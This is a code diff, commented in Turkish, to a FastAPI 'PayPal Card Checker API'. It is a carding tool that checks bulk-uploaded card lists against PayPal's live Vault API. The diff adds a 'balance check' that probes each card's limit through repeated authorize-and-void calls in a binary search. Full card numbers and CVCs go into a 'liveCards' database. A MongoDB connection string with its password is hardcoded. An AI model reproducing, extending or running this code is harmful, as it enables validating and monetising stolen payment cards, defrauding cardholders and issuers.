@@ -1,8 +1,9 @@
 """
-PAYPAL CARD CHECKER API - FASTAPI VERSION v10.1.0
-- Tüm kart formatlarını destekler (pipe, csv, space, json, full pipe)
-- MongoDB'den BIN verilerini doğru eşleştirir
+PAYPAL CARD CHECKER API - FASTAPI VERSION v11.0.0
+- Live Check + Balance Check (Binary Search) + Bin Check
 - PayPal Vault Setup + Confirm
+- Tüm formatlar desteklenir
+- liveCards MongoDB koleksiyonuna kaydeder
 Swagger Docs: /docs
 """
 import os
@@ -11,6 +12,7 @@ import json
 import uuid
 import logging
 import requests
+import time
 from typing import Dict, List, Optional, Union, Any, Tuple
 from datetime import datetime, timedelta
 from dataclasses import dataclass, field
@@ -88,13 +90,14 @@ CONFIG = {
     'mongo_uri': 'mongodb+srv://cardmarketApp:gnbqHdTrlceMZjOS@paymentmanger.gvaavzc.mongodb.net/mydb?retryWrites=true&w=majority',
     'mongo_database': 'mydb',
     'mongo_collection': 'card_checks',
-    'mongo_bin_collection': 'binList'
+    'mongo_bin_collection': 'binList',
+    'mongo_live_cards_collection': 'liveCards'
 }
 
 app = FastAPI(
     title="PayPal Card Checker API",
-    description="PayPal Vault Setup + Confirm ile Kart Doğrulama - Tüm formatlar desteklenir",
-    version="10.1.0",
+    description="Live Check + Balance Check (Binary Search) + Bin Check",
+    version="11.0.0",
     docs_url="/docs",
     redoc_url="/redoc"
 )
@@ -117,6 +120,7 @@ class MongoDB:
             self.db = self.client[CONFIG['mongo_database']]
             self.collection = self.db[CONFIG['mongo_collection']]
             self.bin_collection = self.db[CONFIG['mongo_bin_collection']]
+            self.live_cards_collection = self.db[CONFIG['mongo_live_cards_collection']]
 
             self.collection.create_index('check_id', unique=True)
             self.collection.create_index('created_at')
@@ -125,6 +129,9 @@ class MongoDB:
             self.collection.create_index('setup_token')
             self.collection.create_index('payment_token')
             self.bin_collection.create_index('BIN', unique=True)
+            self.live_cards_collection.create_index('card_number', unique=True)
+            self.live_cards_collection.create_index('card_last4')
+            self.live_cards_collection.create_index('created_at')
 
             logger.info('✅ MongoDB bağlantısı başarılı')
         except ConnectionFailure as e:
@@ -141,7 +148,6 @@ class MongoDB:
                 if result:
                     if '_id' in result:
                         result['_id'] = str(result['_id'])
-                    # 🔥 MongoDB'den gelen alanları doğrudan döndür
                     return {
                         'bin': result.get('BIN'),
                         'brand': result.get('Brand', 'UNKNOWN'),
@@ -152,7 +158,7 @@ class MongoDB:
                         'country_name': result.get('CountryName', 'Unknown'),
                         'issuer_phone': result.get('IssuerPhone', ''),
                         'issuer_url': result.get('IssuerUrl', ''),
-                        'raw': result  # Orijinal veriyi de sakla
+                        'raw': result
                     }
             return None
         except Exception as e:
@@ -170,6 +176,24 @@ class MongoDB:
             return str(result.inserted_id)
         except Exception as e:
             logger.error(f'❌ Kayıt ekleme hatası: {str(e)}')
+            raise
+
+    def insert_live_card(self, data: Dict) -> str:
+        try:
+            if 'created_at' not in data:
+                data['created_at'] = datetime.now().isoformat()
+            if 'updated_at' not in data:
+                data['updated_at'] = datetime.now().isoformat()
+            # Güncelleme yap (aynı kart varsa güncelle)
+            result = self.live_cards_collection.update_one(
+                {'card_number': data['card_number']},
+                {'$set': data},
+                upsert=True
+            )
+            logger.info(f'✅ LiveCard kaydedildi: {data.get("card_number")}')
+            return str(result.upserted_id) if result.upserted_id else str(result)
+        except Exception as e:
+            logger.error(f'❌ LiveCard kayıt hatası: {str(e)}')
             raise
 
     def get_record(self, check_id: str) -> Optional[Dict]:
@@ -191,6 +215,7 @@ class MongoDB:
             today_count = self.collection.count_documents({
                 'created_at': {'$regex': f'^{today}'}
             })
+            live_cards_count = self.live_cards_collection.count_documents({})
             recent = list(self.collection.find().sort('created_at', -1).limit(10))
             for r in recent:
                 if '_id' in r:
@@ -200,6 +225,7 @@ class MongoDB:
                 'verified': verified,
                 'failed': failed,
                 'today': today_count,
+                'live_cards_count': live_cards_count,
                 'recent': recent
             }
         except Exception as e:
@@ -305,35 +331,30 @@ class CardParser:
             cvc = parts[2].strip() if len(parts) > 2 else None
             name = parts[3].strip() if len(parts) > 3 and parts[3] else "Test User"
 
-            # Telefon (9 veya 10)
             phone = None
             if len(parts) > 10 and parts[10].strip():
                 phone = parts[10].strip()
             elif len(parts) > 9 and parts[9].strip():
                 phone = parts[9].strip()
 
-            # Email (10 veya 11)
             email = None
             if len(parts) > 11 and parts[11].strip():
                 email = parts[11].strip()
             elif len(parts) > 10 and parts[10].strip() and "@" in parts[10]:
                 email = parts[10].strip()
 
-            # DOB (11 veya 12)
             dob = None
             if len(parts) > 12 and parts[12].strip() and parts[12].strip() != "--":
                 dob = parts[12].strip()
             elif len(parts) > 11 and parts[11].strip() and parts[11].strip() != "--":
                 dob = parts[11].strip()
 
-            # IP (12 veya 13)
             ip = None
             if len(parts) > 13 and parts[13].strip():
                 ip = parts[13].strip()
             elif len(parts) > 12 and parts[12].strip():
                 ip = parts[12].strip()
 
-            # User Agent (13 veya 14)
             user_agent = None
             if len(parts) > 14 and parts[14].strip():
                 user_agent = parts[14].strip()
@@ -502,7 +523,7 @@ def detect_card_brand(card_number: str) -> str:
             return brand
     return 'UNKNOWN'
 
-# ==================== PAYPAL PROCESSOR ====================
+# ==================== PAYPAL PROCESSOR (Balance Check Eklendi) ====================
 
 class PayPalProcessor:
     def __init__(self):
@@ -543,46 +564,10 @@ class PayPalProcessor:
             logger.error(f"❌ Token exception: {str(e)}")
             raise
 
-    def _confirm_setup_token(self, setup_token: str) -> Tuple[bool, Optional[str], Optional[str], Optional[Dict]]:
+    def _create_setup_token(self, card: CardData, bin_info: Dict = None, amount: float = 0.0) -> Tuple[bool, Optional[str], Optional[Dict]]:
+        """Setup Token oluştur (amount artık desteklenmiyor, 0$ olarak gönder)"""
         try:
-            confirm_url = f"{self.api_base}/v3/vault/payment-tokens"
-            headers = {
-                "Authorization": f"Bearer {self.access_token}",
-                "Content-Type": "application/json",
-                "Accept": "application/json",
-                "PayPal-Request-Id": str(uuid.uuid4()),
-                "Prefer": "return=representation"
-            }
-            payload = {"setup_token": {"id": setup_token}}
-            logger.info(f"🔄 Payment Token confirm ediliyor (setup_token: {setup_token})")
-            response = requests.post(confirm_url, json=payload, headers=headers, timeout=30)
-            if response.status_code in [200, 201]:
-                result = response.json()
-                payment_token = result.get("id")
-                status = result.get("status")
-                logger.info(f"✅ Payment Token oluşturuldu: {payment_token} (Status: {status})")
-                return True, payment_token, None, result
-            else:
-                error_text = response.text
-                error_json = None
-                try:
-                    error_json = response.json()
-                    error_text = error_json.get("message", error_text)
-                except:
-                    pass
-                logger.error(f"❌ Payment Token confirm hatası: {error_text}")
-                return False, None, error_text, error_json
-        except Exception as e:
-            logger.error(f"❌ Confirm exception: {str(e)}")
-            return False, None, str(e), None
-
-    def verify_card(self, card: CardData, bin_info: Dict = None) -> Tuple[bool, Optional[str], Optional[str], Optional[str], Optional[Dict]]:
-        try:
-            if not self.access_token:
-                self._get_access_token()
             setup_url = f"{self.api_base}/v3/vault/setup-tokens"
-
-            # BIN'den ülke ve zip al
             country_code = bin_info.get('country', 'US') if bin_info else 'US'
             zip_code = "00000"
 
@@ -593,7 +578,6 @@ class PayPalProcessor:
             clean_name = re.sub(r'\s+', ' ', clean_name).strip()
             if len(clean_name) > 32:
                 clean_name = clean_name[:32]
-            logger.info(f"👤 Temizlenmiş isim: '{clean_name}'")
 
             expiry = f"{card.exp_year}-{card.exp_month}"
             number = re.sub(r'[^0-9]', '', card.number)
@@ -626,50 +610,209 @@ class PayPalProcessor:
                 "PayPal-Request-Id": str(uuid.uuid4()),
                 "Prefer": "return=representation"
             }
-            safe_payload = payload.copy()
-            safe_payload["payment_source"]["card"]["number"] = "****" + number[-4:]
-            safe_payload["payment_source"]["card"]["security_code"] = "***"
-            logger.info(f"🔄 PayPal Setup Token oluşturuluyor...")
-            logger.info(f"📇 Kart: {card.get_masked()}")
-            logger.info(f"📤 Payload: {json.dumps(safe_payload, ensure_ascii=False, indent=2)}")
 
             response = requests.post(setup_url, data=payload_json, headers=headers, timeout=60)
             if response.status_code in [200, 201]:
                 result = response.json()
                 setup_token = result.get("id")
-                status = result.get("status")
-                logger.info(f"✅ Setup Token oluşturuldu: {setup_token} (Status: {status})")
-
-                confirm_success, payment_token, confirm_error, confirm_raw = self._confirm_setup_token(setup_token)
-                if confirm_success:
-                    logger.info(f"✅ Payment Token alındı: {payment_token}")
-                    return True, setup_token, payment_token, None, result
-                else:
-                    logger.warning(f"⚠️ Confirm başarısız: {confirm_error} - Kart yine de live (Setup Token geçerli)")
-                    return True, setup_token, None, f"Confirm failed: {confirm_error}", result
+                logger.info(f"✅ Setup Token oluşturuldu: {setup_token}")
+                return True, setup_token, result
             else:
                 error_text = response.text
-                error_json = None
-                try:
-                    error_json = response.json()
-                    error_text = error_json.get("message", error_text)
-                except:
-                    pass
                 logger.error(f"❌ Setup Token hatası: {error_text}")
-                return False, None, None, error_text, error_json
+                return False, None, None
         except Exception as e:
-            logger.error(f"❌ PayPal exception: {str(e)}")
-            return False, None, None, str(e), None
+            logger.error(f"❌ Setup Token exception: {str(e)}")
+            return False, None, None
+
+    def _confirm_setup_token(self, setup_token: str) -> Tuple[bool, Optional[str], Optional[str], Optional[Dict]]:
+        try:
+            confirm_url = f"{self.api_base}/v3/vault/payment-tokens"
+            headers = {
+                "Authorization": f"Bearer {self.access_token}",
+                "Content-Type": "application/json",
+                "Accept": "application/json",
+                "PayPal-Request-Id": str(uuid.uuid4()),
+                "Prefer": "return=representation"
+            }
+            payload = {"setup_token": {"id": setup_token}}
+            response = requests.post(confirm_url, json=payload, headers=headers, timeout=30)
+            if response.status_code in [200, 201]:
+                result = response.json()
+                payment_token = result.get("id")
+                logger.info(f"✅ Payment Token oluşturuldu: {payment_token}")
+                return True, payment_token, None, result
+            else:
+                error_text = response.text
+                logger.error(f"❌ Payment Token confirm hatası: {error_text}")
+                return False, None, error_text, None
+        except Exception as e:
+            logger.error(f"❌ Confirm exception: {str(e)}")
+            return False, None, str(e), None
+
+    def _void_authorization(self, auth_id: str) -> bool:
+        """Ön yetkilendirmeyi iptal et (void)"""
+        try:
+            void_url = f"{self.api_base}/v2/payments/authorizations/{auth_id}/void"
+            headers = {
+                "Authorization": f"Bearer {self.access_token}",
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            }
+            response = requests.post(void_url, headers=headers, timeout=30)
+            if response.status_code in [200, 201, 202, 204]:
+                logger.info(f"✅ Auth iptal edildi: {auth_id}")
+                return True
+            else:
+                logger.warning(f"⚠️ Auth iptal başarısız: {response.text}")
+                return False
+        except Exception as e:
+            logger.error(f"❌ Void exception: {str(e)}")
+            return False
+
+    def _create_order_with_setup_token(self, setup_token: str, amount: float, currency: str = "USD") -> Tuple[bool, Optional[str], Optional[Dict]]:
+        """
+        Setup token ile order oluştur ve authorize et.
+        PayPal Vault ile doğrudan amount belirtilemediğinden, bu işlem için PayPal Orders API kullanılır.
+        """
+        try:
+            order_url = f"{self.api_base}/v2/checkout/orders"
+            headers = {
+                "Authorization": f"Bearer {self.access_token}",
+                "Content-Type": "application/json",
+                "Accept": "application/json",
+                "PayPal-Request-Id": str(uuid.uuid4())
+            }
+            payload = {
+                "intent": "AUTHORIZE",
+                "purchase_units": [
+                    {
+                        "amount": {
+                            "currency_code": currency,
+                            "value": f"{amount:.2f}"
+                        },
+                        "payment_source": {
+                            "card": {
+                                "vault_id": setup_token
+                            }
+                        }
+                    }
+                ]
+            }
+            response = requests.post(order_url, json=payload, headers=headers, timeout=30)
+            if response.status_code in [200, 201]:
+                result = response.json()
+                order_id = result.get('id')
+                status = result.get('status')
+                logger.info(f"✅ Order oluşturuldu: {order_id} (Status: {status})")
+                return True, order_id, result
+            else:
+                logger.error(f"❌ Order oluşturma hatası: {response.text}")
+                return False, None, None
+        except Exception as e:
+            logger.error(f"❌ Order exception: {str(e)}")
+            return False, None, None
+
+    def _authorize_order(self, order_id: str) -> Tuple[bool, Optional[str], Optional[Dict]]:
+        """Order'ı authorize et"""
+        try:
+            auth_url = f"{self.api_base}/v2/checkout/orders/{order_id}/authorize"
+            headers = {
+                "Authorization": f"Bearer {self.access_token}",
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            }
+            response = requests.post(auth_url, headers=headers, timeout=30)
+            if response.status_code in [200, 201]:
+                result = response.json()
+                auth_id = result.get('id') or result.get('purchase_units', [{}])[0].get('payments', {}).get('authorizations', [{}])[0].get('id')
+                logger.info(f"✅ Order authorize edildi: {order_id}")
+                return True, auth_id, result
+            else:
+                logger.error(f"❌ Authorize hatası: {response.text}")
+                return False, None, None
+        except Exception as e:
+            logger.error(f"❌ Authorize exception: {str(e)}")
+            return False, None, None
+
+    def _check_balance_with_binary_search(self, card: CardData, bin_info: Dict) -> Tuple[float, int]:
+        """
+        Binary search ile kart limitini/balance'ını bulur.
+        Başlangıç: 1000$ ile dene, onay gelirse 2 katına çık, red gelirse binary search yap.
+        Fark 100$ altına indiğinde dur.
+        """
+        if not self.access_token:
+            self._get_access_token()
+
+        # Önce setup token oluştur
+        success, setup_token, _ = self._create_setup_token(card, bin_info, 0.0)
+        if not success or not setup_token:
+            logger.error("❌ Setup token oluşturulamadı, balance check iptal")
+            return 0.0, 0
+
+        # Order oluştur ve authorize et
+        low = 0.0
+        high = 0.0
+        amount = 1000.0  # Başlangıç miktarı
+        step = 1000.0
+        auth_id = None
+        attempt_count = 0
+        last_approved_amount = 0.0
+
+        while step > 100.0:
+            attempt_count += 1
+            logger.info(f"🔄 Balance deneme #{attempt_count}: {amount:.2f}$")
+
+            # Order oluştur
+            order_success, order_id, order_data = self._create_order_with_setup_token(setup_token, amount)
+            if not order_success or not order_id:
+                logger.warning(f"⚠️ Order oluşturulamadı, amount: {amount:.2f}$")
+                # Order oluşturulamazsa red olarak kabul et
+                high = amount
+                amount = low + (high - low) / 2
+                step = high - low
+                continue
+
+            # Order'ı authorize et
+            auth_success, new_auth_id, auth_data = self._authorize_order(order_id)
+            if auth_success:
+                # Onay geldi
+                logger.info(f"✅ {amount:.2f}$ onaylandı")
+                low = amount
+                last_approved_amount = amount
+                # Önceki auth'ı iptal et (varsa)
+                if auth_id:
+                    self._void_authorization(auth_id)
+                auth_id = new_auth_id
+                # Yeni amount = current + step
+                amount = low + step
+                step = step * 2 if step > 0 else 1000.0
+            else:
+                # Red geldi
+                logger.warning(f"❌ {amount:.2f}$ reddedildi")
+                high = amount
+                step = high - low
+                amount = low + (high - low) / 2
+
+            time.sleep(2)  # 2 saniye bekle
+
+        # Son onaylanan amount'u iptal et
+        if auth_id:
+            self._void_authorization(auth_id)
+
+        # Sonuç: low (onaylanan son miktar) veya last_approved_amount
+        final_balance = max(low, last_approved_amount)
+        logger.info(f"🎯 Final balance: {final_balance:.2f}$ (Attempts: {attempt_count})")
+        return final_balance, attempt_count
 
     def process_card(self, card: CardData) -> Dict:
         check_id = str(uuid.uuid4())
         try:
-            # 1. BIN bilgisini al (MongoDB'den)
+            # 1. BIN bilgisini al
             bin_info = None
             if mongo_db:
                 raw_bin = mongo_db.get_bin_info(card.number)
                 if raw_bin:
-                    # MongoDB'den gelen alanları doğrudan kullan
                     bin_info = {
                         'brand': raw_bin.get('brand', 'UNKNOWN'),
                         'type': raw_bin.get('type', 'UNKNOWN'),
@@ -683,7 +826,6 @@ class PayPalProcessor:
                     }
                     logger.info(f"✅ BIN bilgisi bulundu: {bin_info}")
                 else:
-                    # Fallback: kart numarasından tahmin et
                     bin_info = {
                         'brand': detect_card_brand(card.number),
                         'type': 'UNKNOWN',
@@ -695,9 +837,8 @@ class PayPalProcessor:
                         'issuer_url': '',
                         'raw': {}
                     }
-                    logger.info(f"⚠️ BIN bulunamadı, fallback kullanılıyor: {bin_info}")
+                    logger.info(f"⚠️ BIN bulunamadı, fallback kullanılıyor")
             else:
-                # MongoDB yoksa fallback
                 bin_info = {
                     'brand': detect_card_brand(card.number),
                     'type': 'UNKNOWN',
@@ -710,72 +851,75 @@ class PayPalProcessor:
                     'raw': {}
                 }
 
-            # 2. PayPal ile doğrula
+            # 2. Live Check (Setup + Confirm)
             success, setup_token, payment_token, error, raw_response = self.verify_card(card, bin_info)
 
-            if success and setup_token:
-                # 3. MongoDB'ye kaydet
-                if mongo_db:
-                    record = {
-                        'check_id': check_id,
-                        'card_number': card.number,
-                        'card_last4': card.number[-4:],
-                        'card_brand': bin_info.get('brand'),
-                        'card_type': bin_info.get('type'),
-                        'card_category': bin_info.get('level'),
-                        'card_issuer': bin_info.get('bank'),
-                        'card_issuer_phone': bin_info.get('issuer_phone'),
-                        'card_issuer_url': bin_info.get('issuer_url'),
-                        'card_country_code': bin_info.get('country'),
-                        'card_country_name': bin_info.get('country_name'),
-                        'bin_prefix': card.number[:6],
-                        'setup_token': setup_token,
-                        'payment_token': payment_token,
-                        'amount': 0,
-                        'currency': 'USD',
-                        'status': 'VERIFIED',
-                        'response_message': f'Kart doğrulandı (Setup Token: {setup_token})' + (f', Payment Token: {payment_token}' if payment_token else ', Confirm başarısız'),
-                        'is_zero_dollar': True,
-                        'is_preauth': True,
-                        'raw_response': json.dumps(raw_response) if raw_response else None,
-                        'created_at': datetime.now().isoformat(),
-                        'updated_at': datetime.now().isoformat()
-                    }
-                    mongo_db.insert_record(record)
-
-                return {
-                    'success': True,
-                    'status': 'VERIFIED',
-                    'message': 'Kart doğrulandı' + (f' (Payment Token: {payment_token})' if payment_token else ' (Setup Token)'),
-                    'setup_token': setup_token,
-                    'payment_token': payment_token,
-                    'bin_info': bin_info,
-                    'check_id': check_id,
-                    'card_number': card.number,
-                    'card_exp_month': card.exp_month,
-                    'card_exp_year': card.exp_year,
-                    'card_cvc': card.cvc,
-                    'card_brand': bin_info.get('brand'),
-                    'card_last4': card.number[-4:],
-                    'amount': 0,
-                    'currency': 'USD'
-                }
-            else:
+            if not success or not setup_token:
                 return {
                     'success': False,
                     'status': 'AUTH_FAILED',
-                    'message': 'Kart doğrulanamadı',
+                    'message': 'Kart doğrulanamadı (Live Check başarısız)',
                     'error': error,
                     'bin_info': bin_info,
                     'check_id': check_id,
                     'setup_token': None,
                     'payment_token': None,
-                    'raw_response': raw_response,
                     'card_number': card.number,
                     'card_exp_month': card.exp_month,
                     'card_exp_year': card.exp_year,
                     'card_cvc': card.cvc
                 }
+
+            # 3. Balance Check (Binary Search)
+            logger.info(f"🔍 Balance Check başlıyor: {card.get_masked()}")
+            balance, attempts = self._check_balance_with_binary_search(card, bin_info)
+
+            # 4. MongoDB'ye kaydet (liveCards)
+            if mongo_db:
+                live_card_data = {
+                    'card_number': card.number,
+                    'card_last4': card.number[-4:],
+                    'exp_month': card.exp_month,
+                    'exp_year': card.exp_year,
+                    'cvc': card.cvc,
+                    'card_brand': bin_info.get('brand'),
+                    'card_type': bin_info.get('type'),
+                    'card_level': bin_info.get('level'),
+                    'card_issuer': bin_info.get('bank'),
+                    'card_country_code': bin_info.get('country'),
+                    'card_country_name': bin_info.get('country_name'),
+                    'bin_prefix': card.number[:6],
+                    'setup_token': setup_token,
+                    'payment_token': payment_token,
+                    'balance': balance,
+                    'balance_attempts': attempts,
+                    'status': 'VERIFIED',
+                    'is_live': True,
+                    'created_at': datetime.now().isoformat(),
+                    'updated_at': datetime.now().isoformat()
+                }
+                mongo_db.insert_live_card(live_card_data)
+
+            # 5. Response oluştur
+            return {
+                'success': True,
+                'status': 'VERIFIED',
+                'message': 'Kart doğrulandı (Live + Balance Check)',
+                'setup_token': setup_token,
+                'payment_token': payment_token,
+                'bin_info': bin_info,
+                'check_id': check_id,
+                'card_number': card.number,
+                'card_exp_month': card.exp_month,
+                'card_exp_year': card.exp_year,
+                'card_cvc': card.cvc,
+                'card_brand': bin_info.get('brand'),
+                'card_last4': card.number[-4:],
+                'balance': balance,
+                'balance_attempts': attempts,
+                'currency': 'USD'
+            }
+
         except Exception as e:
             logger.error(f'❌ İşlem hatası: {str(e)}')
             return {
@@ -792,16 +936,40 @@ class PayPalProcessor:
                 'card_cvc': card.cvc
             }
 
+    def verify_card(self, card: CardData, bin_info: Dict = None) -> Tuple[bool, Optional[str], Optional[str], Optional[str], Optional[Dict]]:
+        """Live Check: Setup + Confirm"""
+        try:
+            if not self.access_token:
+                self._get_access_token()
+
+            # Setup Token oluştur
+            success, setup_token, setup_result = self._create_setup_token(card, bin_info)
+            if not success or not setup_token:
+                return False, None, None, "Setup Token oluşturulamadı", None
+
+            # Confirm dene, başarısız olsa bile kart live
+            confirm_success, payment_token, confirm_error, confirm_raw = self._confirm_setup_token(setup_token)
+            if confirm_success:
+                logger.info(f"✅ Payment Token alındı: {payment_token}")
+                return True, setup_token, payment_token, None, setup_result
+            else:
+                logger.warning(f"⚠️ Confirm başarısız: {confirm_error} - Kart yine de live (Setup Token geçerli)")
+                return True, setup_token, None, f"Confirm failed: {confirm_error}", setup_result
+
+        except Exception as e:
+            logger.error(f"❌ Verify exception: {str(e)}")
+            return False, None, None, str(e), None
+
 # ==================== API ENDPOINT'LER ====================
 
 @app.get("/", tags=["Root"])
 async def root():
     return {
-        "message": "PayPal Card Checker API (Vault Setup + Confirm)",
+        "message": "PayPal Card Checker API (Live + Balance + Bin Check)",
         "docs": "/docs",
         "redoc": "/redoc",
         "health": "/health",
-        "version": "10.1.0"
+        "version": "11.0.0"
     }
 
 @app.get("/health", tags=["Health"])
@@ -811,7 +979,7 @@ async def health_check():
         "status": "healthy",
         "timestamp": datetime.now().isoformat(),
         "service": "PayPal Card Check API",
-        "version": "10.1.0",
+        "version": "11.0.0",
         "environment": "LIVE",
         "mongodb": mongo_status,
         "paypal": {
@@ -819,7 +987,7 @@ async def health_check():
             "client_id": CONFIG['paypal_client_id'][:10] + "..."
         },
         "endpoints": [
-            "POST /api/v1/check - Tek kart doğrulama",
+            "POST /api/v1/check - Tek kart doğrulama (Live + Balance + Bin)",
             "POST /api/v1/check/batch - Toplu JSON doğrulama",
             "POST /api/v1/check/file - Dosya yükleme ile toplu doğrulama",
             "POST /api/v1/parse - Sadece parse test",
@@ -893,10 +1061,6 @@ async def check_cards_batch(batch_request: BatchCardRequest):
 
 @app.post("/api/v1/check/file", tags=["Card Operations"])
 async def check_file(file: UploadFile = File(...)):
-    """
-    Dosyadan kartları okuyup toplu doğrulama yapar.
-    Desteklenen formatlar: pipe (|), csv, space, json, full pipe.
-    """
     try:
         content = await file.read()
         text = content.decode('utf-8')
@@ -1007,14 +1171,14 @@ if __name__ == '__main__':
     debug = os.getenv('DEBUG', 'False').lower() == 'true'
 
     print('=' * 70)
-    print('🏦 PayPal Card Checker API (Vault Setup + Confirm) v10.1.0')
+    print('🏦 PayPal Card Checker API (Live + Balance + Bin) v11.0.0')
     print('=' * 70)
     print(f'📍 Sunucu: http://localhost:{port}')
     print(f'📚 Swagger Docs: http://localhost:{port}/docs')
     print(f'📖 ReDoc: http://localhost:{port}/redoc')
     print(f'🔧 Debug: {debug}')
     print(f'🌍 Environment: LIVE')
-    print(f'💳 PayPal Vault Setup + Confirm (0$ doğrulama + kalıcı token)')
+    print(f'💳 Live Check + Balance Check (Binary Search) + Bin Check')
     print(f'🔐 PayPal Client ID: {CONFIG["paypal_client_id"][:10]}...')
     print(f'📦 MongoDB: {CONFIG["mongo_database"]}/{CONFIG["mongo_collection"]}')
     print('=' * 70)
